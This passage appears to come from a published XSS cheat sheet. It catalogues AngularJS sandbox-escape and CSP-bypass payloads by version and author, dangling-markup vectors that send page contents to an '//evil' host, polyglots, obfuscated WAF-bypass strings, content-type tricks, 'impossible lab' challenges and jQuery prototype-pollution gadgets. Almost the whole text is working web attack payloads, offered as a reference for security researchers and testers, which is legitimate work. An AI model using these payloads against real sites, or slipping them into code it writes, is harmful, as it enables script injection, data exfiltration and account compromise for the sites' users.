`{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}`
1.2.19 - 1.2.23
[Mathias Karlsson](https://twitter.com/avlidienbrunn) (Detectify)
124
`{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}`
1.2.24 - 1.2.29
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
23
`{{{}.")));alert(1)//"}}`
1.2.27-1.2.29/1.3.0-1.3.20
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
23
`{{{}.")));alert(1)//"}}`
1.3.0
[Gábor Molnár](https://twitter.com/molnar_g) (Google)
272
`{{!ready && (ready = true) && (\
!call\
? $$watchers[0].get(toString.constructor.prototype)\
: (a = apply) &&\
(apply = constructor) &&\
(valueOf = call) &&\
(''+''.toString(\
'F = Function.prototype;' +\
'F.apply = F.a;' +\
'delete F.a;' +\
'delete F.valueOf;' +\
'alert(1);'\
)));}}`
1.3.3 - 1.3.18
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
128
`{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}`
1.3.19
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
102
`{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}`
1.3.20
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
65
`{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}`
1.4.0 - 1.4.9
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
74
`{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
1.5.0 - 1.5.8
[Ian Hickey](https://twitter.com/ianhickey1024) & [Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
79
`{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`
1.5.9 - 1.5.11
[Jann Horn](https://twitter.com/tehjh) (Google)
517
`{{\
c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\
c.$apply=$apply;c.$eval=b;op=$root.$$phase;\
$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\
C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\
B=C(b,c,b);$evalAsync("\
astNode=pop();astNode.type='UnaryExpression';\
astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\
astNode.argument={type:'Identifier',name:'foo'};\
");\
m1=B($$asyncQueue.pop().expression,null,$root);\
m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\
$eval('a(b.c)');[].push.apply=a;\
}}`
1.5.9 - 1.5.11 shorter
[Jann Horn](https://twitter.com/tehjh) (Google) & Lukasz Plonka
326
`{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}`
>=1.6.0
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
41
`{{constructor.constructor('alert(1)')()}}`
>=1.6.0 (shorter)
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) (Synopsys)
33
`{{$on.constructor('alert(1)')()}}`
### DOM based AngularJS sandbox escapes
(Using orderBy or no $eval)
Version:
Author:
Length:
Vector:
1.0.1 - 1.1.5
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
37
`constructor.constructor('alert(1)')()`
1.2.0 - 1.2.18
[Jann Horn](https://twitter.com/tehjh) (Google)
118
`a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()`
1.2.19 - 1.2.23
[Mathias Karlsson](https://twitter.com/avlidienbrunn) (Detectify)
119
`toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)`
1.2.24 - 1.2.26
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
317
`{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()`
1.2.27-1.2.29/1.3.0-1.3.20
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
20
`{}.")));alert(1)//";`
1.4.0-1.4.5
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
75
`'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';`
1.4.2-1.5.8
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Daniel Kachakil](https://twitter.com/kachakil) (Anvil Ventures)
70
`{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'`
>=1.6.0
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
37
`constructor.constructor('alert(1)')()`
1.4.4 (without strings)
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
134
`toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
### AngularJS CSP bypasses
Version:
Author:
Length:
Vector:
All versions (all browsers) using from
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
91
`<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`
All versions (all browsers) shorter using assignment
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
66
`<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>`
All versions (all browsers) shorter
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
91
`<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`
1.2.0 - 1.5.0
[Eduardo Vela](https://twitter.com/sirdarckcat) (Google)
190
`<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>`
All versions (all browsers) shorter via oncut
[Savan Gadhiya](https://twitter.com/gadhiyasavan) (NotSoSecure)
59
`<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>`
## Scriptless attacks
### Dangling markup
Background attribute
`<body background="//evil?\
<table background="//evil?\
<table><thead background="//evil?\
<table><tbody background="//evil?\
<table><tfoot background="//evil?\
<table><td background="//evil?\
<table><th background="//evil?`
Link href stylesheet
`<link rel=stylesheet href="//evil?`
Link href icon
`<link rel=icon href="//evil?`
Meta refresh
`<meta http-equiv="refresh" content="0; http://evil?`
Img to pass markup through src attribute
`<img src="//evil?\
<image src="//evil?`
Video using track element
`<video><track default src="//evil?`
Video using source element and src attribute
`<video><source src="//evil?`
Audio using source element and src attribute
`<audio><source src="//evil?`
Input src
`<input type=image src="//evil?`
Button using formaction
`<form><button style="width:100%;height:100%" type=submit formaction="//evil?`
Input using formaction
`<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?`
Form using action
`<button form=x style="width:100%;height:100%;"><form id=x action="//evil?`
Object data
`<object data="//evil?`
Iframe src
`<iframe src="//evil?`
Embed src
`<embed src="//evil?`
Use textarea to consume markup and post to external site
`<form><button formaction=//evil>XSS</button><textarea name=x>`
Pass markup data through window.name using form target
`<button form=x>XSS</button><form id=x action=//evil target='`
Pass markup data through window.name using base target
`<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="`
Pass markup data through window.name using formtarget
`<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="`
Using base href to pass data
`<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/`
Using embed window name to pass data from the page
`<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="`
Using iframe window name to pass data from the page
`<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="`
Using object window name to pass data from the page
`<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="`
Using frame window name to pass data from the page
`<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="`
Overwrite type attribute with image in hidden inputs
`<input type=hidden type=image src="//evil?`
Video element with poster attribute
`<video poster="//evil?`
## Polyglots
Polyglot payload 1
`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
Polyglot payload 2
`` javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"\
onmouseover=/*&lt;svg/*/onload=alert()//> ``
Polyglot payload 3
`` javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'> ``
## WAF bypass global objects
XSS into a JavaScript string: string concatenation (window)
`';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (self)
`';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (this)
`';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (top)
`';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (parent)
`';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (frames)
`';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: string concatenation (globalThis)
`';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//`
XSS into a JavaScript string: comment syntax (window)
`';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (self)
`';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (this)
`';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (top)
`';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (parent)
`';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (frames)
`';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: comment syntax (globalThis)
`';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//`
XSS into a JavaScript string: hex escape sequence (window)
`';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (self)
`';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (this)
`';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (top)
`';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (parent)
`';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (frames)
`';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence (globalThis)
`';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (window)
`';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (self)
`';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (this)
`';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (top)
`';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)
`';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)
`';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)
`';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//`
XSS into a JavaScript string: octal escape sequence (window)
`';window['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (self)
`';self['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (this)
`';this['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (top)
`';top['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (parent)
`';parent['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (frames)
`';frames['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: octal escape sequence (globalThis)
`';globalThis['\141\154\145\162\164']('\130\123\123');//`
XSS into a JavaScript string: unicode escape (window)
`';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (self)
`';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (this)
`';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (top)
`';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (parent)
`';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (frames)
`';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: unicode escape (globalThis)
`';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//`
XSS into a JavaScript string: RegExp source property (window)
`';window[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (self)
`';self[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (this)
`';this[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (top)
`';top[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (parent)
`';parent[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (frames)
`';frames[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: RegExp source property (globalThis)
`';globalThis[/al/.source+/ert/.source](/XSS/.source);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (window)
`';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (self)
`';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (this)
`';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (top)
`';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (parent)
`';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (frames)
`';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
XSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis)
`';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`
## Content types
This section lists content-types that can be used for XSS with the X-Content-Type-Options: nosniff header active.
Content-Type
text/html
application/xhtml+xml
application/xml
text/xml
image/svg+xml
text/xsl
application/vnd.wap.xhtml+xml
text/rdf
application/rdf+xml
application/mathml+xml
text/vtt
text/cache-manifest
Browsers
PoC
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fxhtml%2Bxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Fxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=image%2Fsvg%2Bxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Fxsl)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fvnd.wap.xhtml%2Bxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Frdf)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Frdf%2Bxml)
[<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fmathml%2Bxml)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fvtt)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fcache-manifest)
## Response content types
This section lists content-types that can be used for XSS when you can inject into the content-type header.
Content-Type
text/plain; x=x, text/html, foobar
text/html(xxx
text/html xxx
text/html xxx
text/html, xxx
text/html; xxx
Browsers
PoC
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fplain%3B%20x%3Dx%2C%20text%2Fhtml%2C%20foobar)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%28xxx)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%09xxx)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%20xxx)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%2C%20xxx)
[<script>alert(document.domain)</script>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%3B%20xxx)
## Impossible labs
To find out what these are for, please refer to [Documenting the impossible: Unexploitable XSS labs](https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs).
| Title | Description | Length limit | Closest vector | Link |
| --- | --- | --- | --- | --- |
| Basic context, WAF blocks <\[a-zA-Z\] | This lab captures the scenario when you can't use an open tag followed by an alphanumeric character. Sometimes you can solve this problem by bypassing the WAF entirely, but what about when that's not an option? Certain versions of .NET have this behaviour, and it's only known to be exploitable in old IE with <%tag. | N/A | N/A | [🔗](https://portswigger-labs.net/impossible-labs/basic-context-waf-blocks-a-z.php?x=%3Cscript%3Ealert(1)%3C/script%3E) |
| Script based injection but quotes, forward slash and backslash are escaped | We often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.<br>The closest we've got to solving this is when you have multiple injection points. The first [within a script based context and the second in HTML](http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E). | N/A | N/A | [🔗](http://portswigger-labs.net/impossible-labs/script-context-escaped-angle-brackets-allowed.php?x=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E) |
| innerHTML context but no equals allowed | You have a site that processes the query string and URL decodes the parameters but splits on the equals then assigns to innerHTML. In this context <script> doesn't work and we can't use = to create an event. Masato Kinugawa solved this lab and it is now fixed in Chrome. | N/A | N/A | [🔗](https://portswigger-labs.net/impossible-labs/innerHTML-no-equals.php?x=%3Cselect%3E%3Cbutton%3E%3Cselectedcontent%3E%3Cbutton%3E%3Coption%3E%3Csvg%3E%3Cscript%3Ealert(1)) |
| Basic context length limit | This lab's injection occurs within the basic HTML context but has a length limitation of 15. Filedescriptor came up with a vector that could execute JavaScript in 16 characters: <q oncut=alert\`\` but can you beat it? | 15 | <q oncut=alert\`\` | [🔗](https://portswigger-labs.net/impossible-labs/basic-context-length-limit.php?x=%3Csvg%20onload=alert``) |
| Attribute context length limit | The context of this lab inside an attribute with a length limitation of 14 characters. We came up with a vector that executes JavaScript in 15 characters:"oncut=alert\`\`+ the plus is a trailing space. Do you think you can beat it? | 14 | "oncut=alert\`\` | [🔗](https://portswigger-labs.net/impossible-labs/attribute-context-length-limit.php?x=%22oncut=alert``+) |
| Basic context length limit, arbitrary code | It's all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code. | 19 | <q oncut=eval(name) | [🔗](https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3Cq%20oncut=eval(name)) |
| Attribute context length limit arbitrary code | Again calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript. | 17 | [See link](https://lbherrera.github.io/lab/portswigger/18chars.html) | [🔗](https://portswigger-labs.net/impossible-labs/attribute-context-length-limit-arbitrary.php?a=`+alert(document.domain);//&x=%22oncut=%22eval(%27`%27%2bURL)) |
| Injection occurs inside a frameset but before the body | We received a [request from twitter](https://twitter.com/roughwire/status/1250320540625014787?s=20) about this next lab. It occurs within a frameset but before a body tag with equals filtered. You would think you could inject a closing frameset followed by a script block but that would be too easy. | N/A | N/A | [🔗](https://portswigger-labs.net/impossible-labs/after-frameset-before-body.php?x=%3C/frameset%3E%3Cscript%3Ealert(1)%3C/script%3E) |
| Injection occurs inside single quoted string, only characters a-z0-9+'.\` are allowed. | The injection occurs within a single quoted string and the challenge is to execute arbitrary code using the charset a-zA-Z0-9'+.\`. [Luan Herrera](https://twitter.com/lbherrera_) solved this lab in an amazing way, you can view the solution in the following [post.](https://portswigger.net/research/redefining-impossible-xss-without-arbitrary-javascript) | N/A | N/A | [🔗](https://portswigger-labs.net/impossible-labs/arbitrary-code-script-limited-charset.php?x=%27%2balert`1`%2b%27) |
| Injection occurs inside double quoted src attribute of a image element | The double quote is encoded, the challenge is to find a way to execute XSS within a quoted src attribute. | N/A | N/A | [🔗](https://portswigger-labs.net/impossible-labs/inside-image-src-encoded.php?x=1%22onerror=alert(1)+) |
## Prototype pollution
| Library | Payload | Author | Version | Fingerprint |
| --- | --- | --- | --- | --- |
| Wistia Embedded Video | `<script>\<br>Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';\<br></script>` | [William Bowling](https://twitter.com/wcbowling) | All versions | return (typeof wistiaEmbeds !== 'undefined') |
| $(x).off jQuery | `<script>\<br>Object.prototype.preventDefault='x';\<br>Object.prototype.handleObj='x';\<br>Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';\<br>/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) | All versions | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
| $(html) jQuery | `<script>\<br>Object.prototype.div=['1','<img src onerror=alert(1)>','1']\<br></script><script>\<br>$('<div x="x"></div>')\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) | All versions | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
| $.get jQuery | `<script>\<br>Object.prototype.url = ['data:,alert(1)//'];\<br>Object.prototype.dataType = 'script';\<br></script>\<br><script>\<br>$.get('https://google.com/');\<br>$.post('https://google.com/');\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) | >= 3.0.0 | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
| $.getScript jQuery | `<script>\<br>Object.prototype.src = ['data:,alert(1)//']\<br></script>\<br><script>\<br>$.getScript('https://google.com/')\<br></script>` | [s1r1us](https://twitter.com/S1r1u5_) | >= 3.4.0 | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
| $.getScript jQuery | `<script>\<br>Object.prototype.url = 'data:,alert(1)//'\<br></script>\<br><script>\<br>$.getScript('https://google.com/')\<br></script>` | [s1r1us](https://twitter.com/S1r1u5_) | 3.0.0 - 3.3.1 | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
